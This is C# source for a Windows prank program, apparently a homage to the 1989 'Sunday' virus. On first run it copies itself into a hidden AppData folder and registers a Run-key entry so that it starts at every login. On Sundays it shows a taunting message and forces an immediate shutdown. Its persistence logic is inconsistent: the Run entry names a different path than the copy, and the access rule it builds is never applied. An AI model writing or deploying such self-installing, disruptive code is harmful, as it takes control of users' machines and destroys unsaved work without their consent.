using System;
using System.Windows.Forms;
using System.IO;
using System.Reflection;
using System.Security.AccessControl;
using System.Diagnostics;
using Microsoft.Win32;

namespace SunDay
{
    static class Program
    {
        [STAThread]
        static void Main(string[] args)
        {
            string name = Assembly.GetExecutingAssembly().GetName().Name;
            if (Registry.GetValue("HKEY_CURRENT_USER\\Software\\SunDay", "1989", null) == null)
            {
                // I could probably do all this some better way

                Registry.CurrentUser.CreateSubKey("Software\\SunDay");
                Registry.SetValue("HKEY_CURRENT_USER\\Software\\SunDay", "1989", "Sunday");

                if (Registry.GetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "SunDay", null) == null)
                {
                    Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "SunDay", "C:\\Users\\"+Environment.UserName+"\\AppData\\Roaming\\"+name+".exe");
                }
                if (!Directory.Exists("C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\SunDay"))
                {
                    // boogie man
                    DirectoryInfo sun = Directory.CreateDirectory("C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\SunDay");
                    DirectorySecurity dsec = sun.GetAccessControl();
                    
                    sun.Attributes = FileAttributes.Hidden;
                    dsec.AddAccessRule(new FileSystemAccessRule("Everyone", FileSystemRights.FullControl, AccessControlType.Allow));
                    
                    File.Copy(Assembly.GetExecutingAssembly().Location, "C:\\Users\\"+Environment.UserName+"\\AppData\\Roaming\\SunDay\\"+name + ".exe");
                }
            }
            else
            {
                if (DateTime.Today.DayOfWeek.ToString() == "Sunday")
                {
                    // In the original, every file ran on Sunday was deleted, but this didn't happen due to a software bug.
                    // Here, we just shut down the computer, because funny.
                    MessageBox.Show("Today is SunDay! Why do you work so hard? All work and no play make you a dull boy! Come on! Let's go out and have some fun!", "", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    var thing = new ProcessStartInfo("shutdown", "/s /t 0");
                    thing.CreateNoWindow = true;
                    thing.UseShellExecute = false;
                    Process.Start(thing);
                }
            }
        }
    }
}